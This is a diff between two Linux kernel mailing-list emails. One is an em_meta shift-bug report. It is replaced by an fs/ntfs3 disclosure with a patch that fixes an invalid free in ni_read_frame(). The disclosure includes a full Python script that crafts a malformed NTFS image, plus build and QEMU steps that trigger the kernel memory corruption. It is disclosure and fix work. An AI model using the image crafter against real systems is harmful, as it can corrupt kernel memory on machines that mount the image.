@@ -1,55 +1,54 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=117.135.210.5
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=220.197.31.2
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1792456515;
-	b=TkZzR2IlS+ulAKW7cBjCDalqVty4WPWRtthVKEP4rVW8nERBCR4aeqHBJ3YKbeUnv2ws
-	 Kq5A1mMx57fb5imAfHFSdYsltiXt1+aeboaymkZ7vNQfF6BmjsDmvd3C0+5Ka+HLiBdW+
-	 TDhDdQNpxqEyFkdoQa/KCwNZCS5hCgOD0v2JWZjKmsRJYQ3ysSSdxkrOTEKcf3ZLLC4XG
-	 BC/3H7vCMRk/Vb38K1Lecoym3KAIU1D8VDFV/UTXYRxCIOU0FyRx4T080L8Qp+H2I1WdE
-	 6D2EPqHLOQDMZTAPbQyndATj3sMBZp18aBuQT+XsSYiTu2aCDiraVnODwkKhOrJ+fhQ==
+	t=1792456531;
+	b=3VTm/z02Z0M/w0loR3uop6OaGbpmsM6R7H10usU3gD/znV58lvpMlxKGtv2RFib6WWtd
+	 HFcRFRkejqB3zFvdBMhw4BZnlB6pOJOcEtB5EJLEOvzOdwM3aQ79bVgiJKKsJcbRBBxK/
+	 YXtjzoCV/iyl6mPnm7/mYOB+exV4Nqj3nHfLHyHwdbLGg987yeZ/iXByL3JOK7H5p2T6x
+	 zwanXgyU8nVREjTNRgEME2+vgsVsaYV3UQhcWcjRp9OPArzHWnMhKxiRSPKpfeFIFPCBJ
+	 KkpePKYxw3HcV27HpIUJDS1mziy2Vi75Z5IZ3y8Bj6z0PszTLJvf10H1aU7ibJ6499g==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1792456515;
+	a=rsa-sha256; c=relaxed/relaxed; t=1792456531;
 	h=DMARC-Filter:DKIM-Signature:Received:From:To:Cc:Subject:Date:
 	 Message-Id:X-Mailer:MIME-Version:Content-Transfer-Encoding:
 	 X-CM-TRANSID:X-Coremail-Antispam:X-CM-SenderInfo;
-	bh=hITz8gs0faWLxZ/glASJObi4AjjcjXrRjtX1RaulOvA=;
-	b=SG9sTItkCBdonbUQm/zMhpICoSnCRRk8ePRCTjcIfzQTfkrcTJ9zPqDdQT593vu0nEku
-	 am+Q/XAqMzSOmPguXzEqBfgX0PEzxzOFSgWacB50E4mOBJQefxiBGaLUldvD7y3N8MPSA
-	 V6JxYE/qG9bqmdPdzjeVVqvVfdwT93Bs1v2ekPcFg1oByy+jj0Ltr6gvCgxXIGXry+9+m
-	 ozgVPzDe7az7rSMrK9800+SGqKDNJiR24rDX7pQ6oTu7fI62PSfKN9N5+gUPKwggZE+W1
-	 6irZTXtLtuD3j/a0CXEzIt9bOQNtNPn9ochrQM9aiuV6x3GbzUH8FOUIM/gc/T8y8TA==
+	bh=v/QIFBOq4Nj5UbBI7+1Y8y9OTv6KINWJIeF08+43a70=;
+	b=kYGSCm02XbSJwk8lt/PDXURHJComgq3XSyoDuGRFQzuSznVbo5PUU+sivMBLNX/t5tji
+	 AsyYDyB+vMYfLaCKfm4pG2Z8e5l3g617mjcO57aM6+CGBE/BHbU0Scg5X3+5FvN+5SxTP
+	 AhH53X9FHvg02PribY4msv5J0rb0yw4NEvkL08jKVE1hbImm0Xpyx6w+pF3M5GlYVgoGQ
+	 Ag7SoRTOc5AGlYzIW8drElGeQSl4Z1mmFLUxXPrOcHGbo0f7ZX+HPGF2Rarfh+D0LmMTu
+	 PoXIp+5/DyjKfyBLX69tmlR6/lwRI3K9asvJ8I9L/gztLSm54KvE0OQFVH4iDIweerQ==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
 	dmarc=pass header.from=163.com;
 	spf=pass smtp.mailfrom=163.com;
-	dkim=pass header.d=163.com header.i=@163.com header.a=rsa-sha256 header.s=s110527 header.b=csSyvirw;
-	arc=none smtp.remote-ip=117.135.210.5
-Received: from m16.mail.163.com (m16.mail.163.com [117.135.210.5])
+	dkim=pass header.d=163.com header.i=@163.com header.a=rsa-sha256 header.s=s110527 header.b=OrnC3YS9;
+	arc=none smtp.remote-ip=220.197.31.2
+Received: from m16.mail.163.com (m16.mail.163.com [220.197.31.2])
 	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 56E6F606A31A;
-	Tue, 20 Oct 2026 00:35:13 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 56E6F606A31A
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 85B35606A319
+	for <linux-kernel@vger.kernel.org>; Tue, 20 Oct 2026 00:35:30 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 85B35606A319
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=163.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=163.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key, unprotected) header.d=163.com header.i=@163.com header.a=rsa-sha256 header.s=s110527 header.b=csSyvirw
+	dkim=pass (1024-bit key, unprotected) header.d=163.com header.i=@163.com header.a=rsa-sha256 header.s=s110527 header.b=OrnC3YS9
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=163.com;
-	s=s110527; h=From:To:Subject:Date:Message-Id:MIME-Version; bh=hI
-	Tz8gs0faWLxZ/glASJObi4AjjcjXrRjtX1RaulOvA=; b=csSyvirwUcN2OOYkK7
-	KPshFZYZPY2PK1JLtGZL16iEnYDzx/k3nF/yUPbMMcxxExooNQGqT+xHJ83GeZgh
-	4faz+PM8v+RBb0SLsCcvlCbKY73UCM4kR7+kC5FFN//gZsgX5l61hHfAFELsixM+
-	C7KRd5HEuY/3I3SeoikhChIrc=
+	s=s110527; h=From:To:Subject:Date:Message-Id:MIME-Version; bh=v/
+	QIFBOq4Nj5UbBI7+1Y8y9OTv6KINWJIeF08+43a70=; b=OrnC3YS9OnENTVKZyH
+	VDQq7X0uT2KQSnJ8ljnAJSiWusVd/G0Mu2B5UIroEdqmxsBZo/3vkajb4+femizH
+	ibcjfBUAKM4l5YilDSgBsxJmXBY6eztPkgxdUVmEv/wwVa+d7DuTckIuH+b9cy2d
+	NRk0r8SxCLNsxr+msLVxYiK9U=
 Received: from shaos.localdomain (unknown [])
-	by gzsmtp4 (Coremail) with SMTP id PygvCgB3HZktt9Zq616PAw--.45303S2;
-	Tue, 20 Oct 2026 08:34:53 +0800 (CST)
+	by gzga-smtp-mtada-g1-4 (Coremail) with SMTP id _____wDnTyM6t9Zqd1hEBA--.28269S2;
+	Tue, 20 Oct 2026 08:35:06 +0800 (CST)
 From: shaos <shawnq1@163.com>
-To: jhs@mojatatu.com
-Cc: Jiri Pirko <jiri@resnulli.us>,
-	netdev@vger.kernel.org,
+To: almaz.alexandrovich@paragon-software.com
+Cc: ntfs3@lists.linux.dev,
 	linux-kernel@vger.kernel.org
-Subject: [BUG] net: sched: em_meta accepts shifts outside the integer width
-Date: Tue, 20 Oct 2026 00:34:53 +0000
-Message-Id: <20261020003453.1010097-1-shawnq1@163.com>
+Subject: [PATCH] fs/ntfs3: keep the ADS run tree when reading compressed streams
+Date: Tue, 20 Oct 2026 00:35:06 +0000
+Message-Id: <20261020003506.1010276-1-shawnq1@163.com>
 X-Mailer: git-send-email 2.34.1
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
@@ -61,16 +60,16 @@ List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
 Precedence: list
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
-X-CM-TRANSID:PygvCgB3HZktt9Zq616PAw--.45303S2
-X-Coremail-Antispam: 1Uf129KBjvJXoW7ury5Ww4DZFykArWDZr45Awb_yoW8tr1DpF
-	yvk3W3JF9FkF4qqw4q9a1UX39Y9wsakw15G3WkC3W8urW5Kr1YkryFqFW5Wa47Wrn5G34Y
-	vFs0q3s7W3yDAaUanT9S1TB71UUUUU7qnTZGkaVYY2UrUUUUjbIjqfuFe4nvWSU5nxnvy2
-	9KBjDUYxBIdaVFxhVjvjDU0xZFpf9x07j0OJ5UUUUU=
-X-CM-SenderInfo: pvkd40jtr6il2tof0z/xtbC8Q1JV2rWty09hwAA3+
+X-CM-TRANSID:_____wDnTyM6t9Zqd1hEBA--.28269S2
+X-Coremail-Antispam: 1Uf129KBjvJXoW3Kr43Ww43KryrWF4rKFyrCrg_yoWDWFWkpa
+	y3Zw4Iyw4fXF10qw4DG3W8u34fKwnxGw15GFs8Z34rCF9Ikr4vyFy8try8uFW5tr98Wa4x
+	Xw4qga1xtFyDtaUanT9S1TB71UUUUU7qnTZGkaVYY2UrUUUUjbIjqfuFe4nvWSU5nxnvy2
+	9KBjDUYxBIdaVFxhVjvjDU0xZFpf9x07UlksgUUUUU=
+X-CM-SenderInfo: pvkd40jtr6il2tof0z/xtbC8RpMWmrWtzo+hgAA30
 
 Hello,
 
-em_meta accepts a user-controlled shift exponent in tcf_meta_val and meta_int_apply_extras() applies it to an unsigned long without checking the range.  A shift of 64 on a 64-bit kernel reaches C undefined behavior in the network classifier.
+ni_read_frame() saves a pointer to the stream inode's embedded file.run tree and then changes ni to ni->base.  The cleanup compares that pointer with the base inode's run tree and calls run_free() on the still-live stream inode member.  Reading a compressed named $DATA stream therefore produces a KASAN invalid-free in the normal NTFS3 read path.
 
 HEAD commit:    fe2ec83746e501645709761605c2464a44fd2929
 git tree:       upstream Linux checkout, local branch master
@@ -78,25 +77,254 @@ source version: Linux 7.3.0-rc4-70-gfe2ec83746e50
 compiler:       gcc 11.4.0, GNU ld 2.38 (from the kernel build banner)
 
 console output:
-https://gist.githubusercontent.com/shaos26/4d0a6531f00fd3baeabe040993953402/raw/1677be670d3d39c0054b4ecd40c69b375630381c/console-output.txt
+https://gist.githubusercontent.com/shaos26/e66aded6793e16ac4e56185cea3533de/raw/7d1e782356e9104f55bd6d08876f121c92ba59ae/console-output.txt
 kernel config:
-https://gist.githubusercontent.com/shaos26/4d0a6531f00fd3baeabe040993953402/raw/e47da1b0ca0ffe6d0ac3a988e2c30c7eb634ede3/kernel-config.txt
+https://gist.githubusercontent.com/shaos26/e66aded6793e16ac4e56185cea3533de/raw/e47da1b0ca0ffe6d0ac3a988e2c30c7eb634ede3/kernel-config.txt
 reproducer:
-https://gist.githubusercontent.com/shaos26/4d0a6531f00fd3baeabe040993953402/raw/1f5f1944a0a8d87af969b58f80c4dfb10e50eca2/poc.c
+https://gist.githubusercontent.com/shaos26/e66aded6793e16ac4e56185cea3533de/raw/d32903403be7b958ee0b52c5ea417ac674e9eb09/poc.c
 
-Build and run the standalone PoC on a 64-bit kernel with UBSAN enabled.  The program creates its own user and network namespaces, installs the em_meta filter, and sends the triggering packet:
+Build the kernel from HEAD with the attached config, then create a compressed ADS image and a minimal initramfs.  The following commands use ntfs-3g tools mkntfs and ntfscp:
 
-    gcc -O2 -Wall -Wextra -static -o em_meta_shift_poc poc.c
-    ./em_meta_shift_poc pos
-    ./em_meta_shift_poc ctrl
-    ./em_meta_shift_poc nofilter
+    mkdir -p build run/rootfs
+    cp kernel-config.txt build/.config
+    make O=build olddefconfig
+    make O=build -j"$(nproc)" bzImage
+    dd if=/dev/zero of=run/base.img bs=1M count=64 status=none
+    mkntfs -F -q -L vulntest -c 4096 -s 512 run/base.img
+    printf 'HELLO-BASE-DATA-' > run/base.txt
+    ntfscp -q -f run/base.img run/base.txt victim
+    printf 'CONTROL-ADS-DATA' > run/ads2.txt
+    ntfscp -q -f -N ads2 run/base.img run/ads2.txt victim
+    printf 'ATTACK-ADS-DATA' > run/ads1.txt
+    ntfscp -q -f -N ads1 run/base.img run/ads1.txt victim
 
-Two fresh boots with shift=64 reported UBSAN shift-out-of-bounds in meta_int_apply_extras(); shift=8 matched without a report, and a no-filter control was clean.  The observed effect is undefined behavior and a wrong classifier result; x86 masks the hardware shift count, and no memory corruption or privilege escalation is shown.
+Save the following source as craft_image.py, then run it on run/base.img to produce run/crafted.img.  It sets the COMPRESSED flag on only the ads1 $DATA attribute and repairs the MFT update-sequence fixups.
+
+--- craft_image.py ---
+#!/usr/bin/env python3
+# Craft an NTFS image exercising fs/ntfs3 ni_read_frame() ADS run-tree mis-ownership.
+# Input : base.img  (mkntfs + ntfscp-created "victim" file with ADS "ads1"/"ads2")
+# Output: crafted.img with the "$DATA:ads1" attribute's COMPRESSED flag set.
+import struct, sys, shutil
+
+SRC = sys.argv[1] if len(sys.argv) > 1 else "base.img"
+DST = sys.argv[2] if len(sys.argv) > 2 else "crafted.img"
+
+img = bytearray(open(SRC, "rb").read())
+
+sect_size = struct.unpack_from("<H", img, 0x0B)[0]
+sect_per_cl = img[0x0D]
+cl_size = sect_size * sect_per_cl
+mft_lcn = struct.unpack_from("<Q", img, 0x30)[0]
+cpr = struct.unpack_from("<b", img, 0x40)[0]
+rec_size = 1 << (-cpr) if cpr < 0 else cpr * cl_size
+print(f"[*] sector={sect_size} cluster={cl_size} mft_lcn={mft_lcn} rec_size={rec_size}")
+
+def read_runs(attr, base_off):
+    """parse a non-resident attribute's run list -> list of (vcn_start, lcn)"""
+    run_off = struct.unpack_from("<H", attr, 0x20)[0]
+    p = base_off + run_off
+    end = base_off + len(attr)
+    vcn = 0
+    runs = []
+    while p < end:
+        hdr = attr[p - base_off]
+        p += 1
+        if hdr == 0:
+            break
+        ls, os = hdr & 0xF, hdr >> 4
+        ln = int.from_bytes(attr[p - base_off:p - base_off + ls], "little"); p += ls
+        if os == 0:
+            lcn = None
+        else:
+            off = int.from_bytes(attr[p - base_off:p - base_off + os], "little", signed=True); p += os
+            lcn = (runs[-1][1] if runs and runs[-1][1] is not None else 0) + off if False else None
+        runs.append([vcn, ln, None])
+        vcn += ln
+    # second pass with proper deltas
+    p = base_off + run_off
+    prev = 0
+    runs = []
+    vcn = 0
+    while p < end:
+        hdr = img[p]; p += 1
+        if hdr == 0:
+            break
+        ls, os = hdr & 0xF, hdr >> 4
+        ln = int.from_bytes(img[p:p + ls], "little"); p += ls
+        if os == 0:
+            lcn = None
+        else:
+            off = int.from_bytes(img[p:p + os], "little", signed=True); p += os
+            prev = prev + off
+            lcn = prev
+        runs.append((vcn, ln, lcn))
+        vcn += ln
+    return runs
+
+def record_off(rno):
+    """physical byte offset of MFT record rno, via $MFT $DATA runlist"""
+    byte_off = rno * rec_size
+    cl = byte_off // cl_size
+    within = byte_off % cl_size
+    for vcn, ln, lcn in mft_runs:
+        if vcn <= cl < vcn + ln:
+            assert lcn is not None, "sparse $MFT"
+            return lcn * cl_size + (cl - vcn) * cl_size + within
+    raise SystemExit(f"record {rno} outside $MFT runlist")
+
+# --- parse MFT record 0 to obtain $MFT runlist -------------------------------
+r0 = mft_lcn * cl_size
+rec0 = img[r0:r0 + rec_size]
+usa_off, usa_cnt = struct.unpack_from("<HH", rec0, 4)
+def unfix(rec):
+    rec = bytearray(rec)
+    for i in range(1, usa_cnt):
+        se = i * sect_size - 2
+        rec[se:se + 2] = rec[usa_off + 2 * i: usa_off + 2 * i + 2]
+    return rec
+rec0c = unfix(rec0)
+assert rec0c[0:4] == b"FILE"
+attr_off = struct.unpack_from("<H", rec0c, 0x14)[0]
+used = struct.unpack_from("<I", rec0c, 0x18)[0]
+mft_runs = None
+o = attr_off
+while o + 8 <= used:
+    t, sz = struct.unpack_from("<II", rec0c, o)
+    if t == 0xFFFFFFFF:
+        break
+    if t == 0x80 and rec0c[o + 8] == 1 and rec0c[o + 9] == 0:
+        mft_runs = read_runs(rec0c[o:o + sz], r0 + o)
+    o += sz
+assert mft_runs, "no $MFT runlist"
+print(f"[*] $MFT runs (vcn,len,lcn): {mft_runs[:8]}{'...' if len(mft_runs) > 8 else ''}")
+
+# --- find the record holding the base file by scanning for its $FILE_NAME ----
+def find_victim(name="victim"):
+    for rno in range(24, 256):
+        try:
+            off = record_off(rno)
+        except SystemExit:
+            break
+        rec = img[off:off + rec_size]
+        if rec[0:4] != b"FILE":
+            continue
+        rc = unfix(rec)
+        aoff = struct.unpack_from("<H", rc, 0x14)[0]
+        use = struct.unpack_from("<I", rc, 0x18)[0]
+        o = aoff
+        while o + 8 <= use:
+            t, sz = struct.unpack_from("<II", rc, o)
+            if t == 0xFFFFFFFF:
+                break
+            if t == 0x30 and rc[o + 9] == 0:  # $FILE_NAME (unnamed attr)
+                do = struct.unpack_from("<H", rc, o + 0x14)[0]  # resident data_off
+                nlen = rc[o + do + 0x40]
+                ns = rc[o + do + 0x41]
+                nm = rc[o + do + 0x42:o + do + 0x42 + 2 * nlen].decode("utf-16-le", "replace")
+                if nm == name and ns != 2:  # skip DOS namespace
+                    return rno, off, rc
+            o += sz
+    raise SystemExit("victim record not found")
+
+rno, roff, rec = find_victim()
+print(f"[*] victim in MFT record {rno} @ file offset {roff:#x}")
+
+aoff = struct.unpack_from("<H", rec, 0x14)[0]
+use = struct.unpack_from("<I", rec, 0x18)[0]
+o = aoff
+patched = 0
+while o + 8 <= use:
+    t, sz = struct.unpack_from("<II", rec, o)
+    if t == 0xFFFFFFFF:
+        break
+    if t == 0x80 and rec[o + 9]:
+        nlen = rec[o + 9]
+        noff = struct.unpack_from("<H", rec, o + 0x0A)[0]
+        nm = rec[o + noff:o + noff + 2 * nlen].decode("utf-16-le", "replace")
+        if nm == "ads1":
+            fl = struct.unpack_from("<H", rec, o + 0x0C)[0]
+            print(f"[*] $DATA:{nm} at record off {o:#x} size={sz:#x} non_res={rec[o+8]} "
+                  f"flags={fl:#06x} data_size={struct.unpack_from('<I', rec, o+0x10)[0]}")
+            rec[o + 0x0C:o + 0x0E] = struct.pack("<H", fl | 0x0001)
+            patched += 1
+        elif nm == "ads2":
+            fl = struct.unpack_from("<H", rec, o + 0x0C)[0]
+            print(f"[*] $DATA:{nm} at record off {o:#x} size={sz:#x} non_res={rec[o+8]} "
+                  f"flags={fl:#06x} data_size={struct.unpack_from('<I', rec, o+0x10)[0]} (control, unpatched)")
+    o += sz
+assert patched == 1, f"expected exactly one ads1 attr, patched={patched}"
+
+# --- re-apply fixups and write back -----------------------------------------
+usn = rec[usa_off:usa_off + 2]
+for i in range(1, usa_cnt):
+    se = i * sect_size - 2
+    rec[usa_off + 2 * i: usa_off + 2 * i + 2] = rec[se:se + 2]
+    rec[se:se + 2] = usn
+img[roff:roff + rec_size] = rec
+
+open(DST, "wb").write(img)
+print(f"[+] wrote {DST}")
+
+# --- verify by re-reading ----------------------------------------------------
+chk = bytearray(open(DST, "rb").read())[roff:roff + rec_size]
+chk = unfix(chk)
+o = aoff
+while o + 8 <= use:
+    t, sz = struct.unpack_from("<II", chk, o)
+    if t == 0xFFFFFFFF:
+        break
+    if t == 0x80 and chk[o + 9]:
+        nlen = chk[o + 9]
+        noff = struct.unpack_from("<H", chk, o + 0x0A)[0]
+        nm = chk[o + noff:o + noff + 2 * nlen].decode("utf-16-le", "replace")
+        print(f"[v] $DATA:{nm} flags={struct.unpack_from('<H', chk, o + 0x0C)[0]:#06x}")
+    o += sz
+--- end craft_image.py ---
+
+Build the guest trigger and boot it with the image attached as /dev/vda:
+
+    cc -static -O2 -Wall -Wextra -o poc poc.c
+    cp poc run/rootfs/init
+    (cd run/rootfs && find init | cpio -o -H newc --owner=0:0) | gzip -9 > run/initramfs.cpio.gz
+    timeout 900 qemu-system-x86_64 -kernel build/arch/x86/boot/bzImage \
+        -initrd run/initramfs.cpio.gz \
+        -drive file=run/crafted.img,if=virtio,format=raw,snapshot=on \
+        -append "console=ttyS0 rdinit=/init panic=-1 loglevel=4" \
+        -nographic -m 4096 -smp 2 -no-reboot 2>&1 | tee run/run.log
+
+Two fresh crafted images triggered the same KASAN invalid-free at ni_read_frame(): the freed address was offset 0x1c8 inside a live 1680-byte ntfs_inode_cache object.  A fix-control kernel that moved the run assignment after ni = ni->base completed the read cleanly; an uncompressed ADS control also completed without the report.
 
 Impact and prerequisites:
-The demonstrated result is kernel undefined behavior visible under UBSAN and incorrect packet classification.  UBSAN is needed for the diagnostic; the current evidence does not establish a production crash or a security boundary violation.
+Mounting an attacker-controlled NTFS image is required and normally requires a privileged mount.  KASAN reports a deterministic kernel bug; without KASAN, freeing an interior pointer to a live inode can corrupt slab state.  No privilege escalation or code execution has been demonstrated.
 
-Validation: Two fresh boots reported UBSAN shift-out-of-bounds for shift 64.  Shift 8 and no-filter controls were clean; no memory corruption or privilege escalation was observed.
+Move the run-tree pointer assignment until after the inode has been redirected to its base record:
+
+diff --git a/fs/ntfs3/frecord.c b/fs/ntfs3/frecord.c
+--- a/fs/ntfs3/frecord.c
++++ b/fs/ntfs3/frecord.c
+@@ -2282,7 +2282,7 @@
+ 	char *frame_ondisk = NULL;
+ 	char *frame_mem = NULL;
+ 	struct ATTR_LIST_ENTRY *le = NULL;
+-	struct runs_tree *run = &ni->file.run;
++	struct runs_tree *run;
+ 	u64 valid_size = ni->i_valid;
+ 	u64 vbo_disk;
+ 	size_t unc_size = 0;
+@@ -2292,6 +2292,7 @@
+ 	CLST frame, clst_data;
+ 
+ 	ni = ni->base;
++	run = &ni->file.run;
+ 	/*
+ 	 * To simplify decompress algorithm do vmap for source
+ 	 * and target pages.
+
+Fixes: be310476e8868 ("fs/ntfs3: Add basic support for alternative data streams")
+Signed-off-by: shaos <shawnq1@163.com>
+
+Validation: Unfixed kernel: same KASAN invalid-free on two fresh images.  Fix-control kernel: one clean run.  The report PoC is the guest trigger; image preparation requires the separate mutator noted above.
 
 Thanks,
 
